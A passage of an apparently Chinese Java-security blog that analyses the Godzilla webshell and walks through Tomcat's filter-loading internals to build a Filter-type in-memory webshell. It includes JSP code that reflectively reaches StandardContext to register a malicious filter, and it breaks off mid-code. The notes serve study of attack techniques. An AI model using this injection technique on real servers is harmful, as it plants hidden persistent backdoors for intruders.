    response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着会走到<code>nolog</code>里面，利用反射隐藏请求的日志。这里应该是只隐藏在tomcat下的日志，未测试。</p><h4 id="f-toString"><a href="#f-toString" class="headerlink" title="f.toString()"></a><code>f.toString()</code></h4><p>从<code>this.paramterMap</code>里面获取要执行的模块参数等变量，然后进入<code>this.run()</code>执行<code>payload.class</code>定义好的shell功能：<br><img src="/2022/05/17/godzilla/7.png"></p><p>第三次请求是调用了<code>methodNameClose</code>函数，不再分析。整个流程分析下来会发现哥斯拉一开始就把一个大马的功能实现发送到了服务端，之后的功能都是通过调用大马实现好的功能完成的。</p><p>至此Y4er师傅的文章算是看懂了：<a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></p><p>在Spring里面的三个<code>equeals</code>:</p><ul><li>f.equals(arrOut) 必须的，使用ByteArrayOutputStream返回执行的结果</li><li>f.equals(data)   必须的，接收客户端传过来的参数</li><li>f.equals(req)    非必要，对于Spring的Servlet是非必要的，用于隐藏日志。</li></ul><p>所以在Spring里面的Servlet，第三个<code>equals</code>去掉不影响正常shell功能。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></li><li><a href="https://mp.weixin.qq.com/s/lmL6XyWKClEmYgiVUspYYw">哥斯拉源码分析(二)jsp shell分析</a></li><li><a href="https://tttang.com/archive/1513/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li><li><a href="https://github.com/rebeyond/Behinder/issues/151">想尝试修改到Spring boot 内存马的支持中，而Spring没有pageContext对象</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全笔记(3)-内存马之Filter型</title>
      <link href="/2022/04/14/memory-shell-1.html"/>
      <url>/2022/04/14/memory-shell-1.html</url>
      
        <content type="html"><![CDATA[<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p><img src="/2022/04/14/memory-shell-1/Servlet.png"></p><p>当处理请求的时候：请求 → Listener → Filter → Servlet</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listener也称之为监听器，可以监听Application、Session和Request对象的创建、销毁事件，以及监听对其中添加、修改、删除属性事件，并自动执行自定义的功能。</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filter也称之为过滤器，可以动态地修改HttpServletRequest，HttpServletResponse中的头和数据。</p><h4 id="Servlet-1"><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servlet是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。Servlet 可以理解为某一个路径后续的业务处理逻辑。</p><p>Tomcat是http服务器+servlet容器，当Tomcat作为Servlet容器的时候，讲http请求文本解析之后封装成<code>HttpServletRequest</code>类型的request对象，传递给Servlet，同时讲相应的信息封装为<code>HttpServletResponse</code>类型的response对象，将response对象交给tomcat，tomcat格式化之后返回给浏览器</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h4 id="容器组件（Container）"><a href="#容器组件（Container）" class="headerlink" title="容器组件（Container）"></a>容器组件（Container）</h4><p>Tomcat有四种类型的Servlet容器组件，从上到下：</p><ol><li>Engine：<code>org.apache.catalina.core.StandardEngine</code><ul><li>最顶层容器组件，其下可以包含多个Host</li></ul></li><li>Host: <code>org.apache.catalina.core.StandardHost</code><ul><li>一个Host代表一个虚拟主机，其下可以包含多个 Context。</li></ul></li><li>Context: <code>org.apache.catalina.core.StandardContext</code><ul><li>一个Context 代表一个Web应用，其下可以包含多个 Wrapper</li></ul></li><li>Wrapper: <code>org.apache.catalina.core.StandardWrapper</code><ul><li>一个Wrapper 代表一个Servlet</li></ul></li></ol><p>每个Host下可以有多个Context（Context是Host的子容器），每个Context都代表一个具体的Web应用，都有一个唯一的路径就相当于下图中的<code>/shop/manager</code>这种，在一个 Context下可以有着多个Wrapper, Wrapper主要负责管理Servlet, 包括的Servlet的装载、初始化、执行以及资源回收</p><p><img src="/2022/04/14/memory-shell-1/1.png"></p><h2 id="Context"><a href="#Context" class="headerlink" title="*Context"></a>*Context</h2><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>在<code>javax.servlet.ServletContext</code>里面，Servlet规定了<code>ServletContext</code>接口:<br><img src="/2022/04/14/memory-shell-1/2.png"></p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>在<code>org.apache.catalina.core.ApplicationContext</code>里面，<code>ApplicationContext</code>类是<code>ServletContext</code>的接口实现，<code>ApplicationContext</code>类的实例和<code>StandardContext</code>的每个实例相关联，比如向<code>StandardContext</code>实例添加<code>fiterDef</code>等<br><img src="/2022/04/14/memory-shell-1/3.png"></p><h4 id="StanderContext"><a href="#StanderContext" class="headerlink" title="StanderContext"></a>StanderContext</h4><p><code>org.apache.catalina.Context</code>的默认标准实现为<code>org.apache.catalina.core.StandardContext</code>，表示每一个web应用</p><h2 id="Tomcat下Filter的实现逻辑"><a href="#Tomcat下Filter的实现逻辑" class="headerlink" title="Tomcat下Filter的实现逻辑"></a>Tomcat下Filter的实现逻辑</h2><h3 id="Filter的初始化"><a href="#Filter的初始化" class="headerlink" title="Filter的初始化"></a>Filter的初始化</h3><p>在IDEA里面新建项目之后新增测试代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestFilter.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec doFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestServlet.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"TestServlet"</span><span class="token punctuation">,</span> urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/TestServlet"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello GET~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello POST~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在<code>web.xml</code>里面新增Filter的配置项：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>basic.TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/TestServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在web.xml这个文件里面，<code>&lt;filter&gt;&lt;/filter&gt;</code>标签其实对应的就是<code>org.apache.tomcat.util.descriptor.web.FilterDef</code>，<code>&lt;filter-mapping&gt;&lt;/filter-mapping&gt;</code>标签对应的是<code>org.apache.tomcat.util.descriptor.web.FilterMap</code></p><p>在<code>StandardContext</code>类中的startInternal方法里可以看到这样的加载顺序:<br><img src="/2022/04/14/memory-shell-1/tomcat-1.png"><br>先启动listener，再者是Filter，最后是Servlet。详细分析filterStart中是如何加载Filter链的，相关代码如下图所示:<br><img src="/2022/04/14/memory-shell-1/tomcat-2.png"><br>首先通过遍历从filterDefs中获取key和value，将value封装为<code>ApplicationFilterConfig</code>对象放入<code>filterConfigs</code>变量中。<br>然后在<code>StandardContext</code>的add方法下断点：<br><img src="/2022/04/14/memory-shell-1/tomcat-3.png"></p><p>Tomcat会先在<code>ContextConfig.java</code>里面从<code>web.xml</code>读取已定义的Filter，然后加入到<code>StandardContext</code>的实例化<code>context</code>里面：<br><img src="/2022/04/14/memory-shell-1/tomcat-4.png"><br>上面的两个方法都在<code>StandardContext</code>里面：<br><img src="/2022/04/14/memory-shell-1/tomcat-5.png"></p><p>接着是<code>org.apache.catalina.core.StandardContext#filterStart</code>根据已有的<code>filterDefs</code>，遍历之后存储到<code>filterConfigs</code>里面：<br><img src="/2022/04/14/memory-shell-1/tomcat-6.png"></p><p>经过上面几个步骤的处理，tomcat启动初始化完成，把web.xml里面的Filter包装好之后放在了<code>StandardContext</code>。<br>总结来说是这几个步骤：</p><ol><li>我们在代码里面定义好Filter的处理逻辑</li><li>Tomcat根据web.xml的配置包装成FilterDef和FilterMap，分别添加到filterDefs和filterMaps，这两个对象的定义都在<code>org.apache.tomcat.util.descriptor.web</code>包里面</li><li>遍历<code>filterDefs</code>对象使用<code>ApplicationFilterConfig</code>对value进行封装，封装之后的对象放入<code>filterConfigs</code>中</li><li>这个时候在<code>StandardContext</code>里面有三种对象初始化完成： <code>FilterDefs</code>、<code>Filterconfigs</code>、<code>FilterMaps</code></li></ol><p> PS: 再这个阶段Tomcat会运行Filter里面的代码</p><h3 id="Filter的运行逻辑"><a href="#Filter的运行逻辑" class="headerlink" title="Filter的运行逻辑"></a>Filter的运行逻辑</h3><p>以上是Tomcat启动过程，回到上面讲的tomcat容器组件关系图， 在容器组件结构中最底层的是<code>org.apache.catalina.core.StandardWrapper</code>，在对应的源代码里面可以看到构造函数：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * Create a new StandardWrapper component with the default basic Valve. */</span><span class="token keyword">public</span> <span class="token class-name">StandardWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    swValve<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardWrapperValve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pipeline<span class="token punctuation">.</span><span class="token function">setBasic</span><span class="token punctuation">(</span>swValve<span class="token punctuation">)</span><span class="token punctuation">;</span>    broadcaster <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NotificationBroadcasterSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>里面调用了Filter相关的逻辑代码：<br><img src="/2022/04/14/memory-shell-1/tomcat-7.png"><br>此时发起一个Get请求，打断点跟进<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-8.png"><br>到最后返回了filterChains对象，接着返回执行<code>filterChain.doFilter(request.getRequest(), response.getResponse());</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-9.png"></p><p>跟进之后会进入到<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-10.png"></p><p>跟进之后进入我们自定义的Filter逻辑里面去：<br><img src="/2022/04/14/memory-shell-1/tomcat-11.png"></p><p>来自宽字节师傅的总结图：<br><img src="/2022/04/14/memory-shell-1/filter.png"></p><p>来自<a href="http://wjlshare.com/archives/1529">大木头师傅</a>的总结:</p><blockquote><ol><li>根据请求的URL从FilterMaps中找出与之URL对应的Filter名称</li><li>根据Filter名称去FilterConfigs中寻找对应名称的FilterConfig</li><li>找到对应的FilterConfig之后添加到 FilterChain中，并且返回FilterChain</li><li>filterChain中调用 internalDoFilter遍历获取 chain 中的 FilterConfig ，然后从FilterConfig中获取Filter，然后调用Filter的doFilter方法</li></ol></blockquote><p>至此Filter的处理流程分析完成，主要分两个大部分，Filter的初始化和Filter的运行逻辑，如果要在tomcat里面插入Filter类型的木马，首先需要在代码里面完成Filter初始化的流程：</p><ol><li>创建恶意Filter</li><li>使用FilterDef对Filter包装</li><li>将FilterDef加入到<code>FilterDefs</code>，遍历<code>FilterDefs</code>包装为<code>FilterConfigs</code></li><li>创建FilterMap，将Filter和urlpattern对应，存放到<code>filterMaps</code></li><li>把创建的<code>FilterDefs</code>、<code>Filterconfigs</code>、<code>FilterMaps</code>放到<code>StandardContext</code></li></ol><h2 id="创建内存马"><a href="#创建内存马" class="headerlink" title="创建内存马"></a>创建内存马</h2><p>为了获取到<code>StandardContext</code>对象，我们需要先搞清楚这个对象在整Tomcat里面的结构位置：<br><code>StandardContext</code> –&gt; <code>ApplicationContext</code> –&gt; <code>ApplicationContextFacade</code></p><p>从最上层开始在<code>org.apache.catalina.core.ApplicationContextFacade</code>可以找到<code>ApplicationContext</code>:<br><img src="/2022/04/14/memory-shell-1/context-1.png"><br>根据学到的反射原理和网上大部分Filter类型的内存马，调试如下的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token comment">//获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从ApplicationContextFade获取context，这里context是指ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取ApplicationContext</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最开始的代码是<code>ServletContext servletContext = request.getSession().getServletContext();</code>，如果看了<code>org.apache.catalina.core.ApplicationContextFacade</code>就明白这里是一个<code>servletContext</code>对象的实现，所以使用<code>servletContext</code>来表示，接下来就是通过反射获取<code>ApplicationContextFacade</code>的私有变量<code>context</code>，实际上就是<code>ApplicationContext</code>，然后同样的方法去<code>ApplicationContext</code>通过反射获取<code>StandardContext</code>：<br><img src="/2022/04/14/memory-shell-1/context-2.png"></p><p>完整代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Scanner"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Map"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token comment">//获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从ApplicationContextFade获取context，这里context是指ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取ApplicationContext</span>  <span class="token class-name">Field</span> standCtx <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standCtx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standCtx<span class="token punctuation">.</span><span class="token function">get</span><span class="token 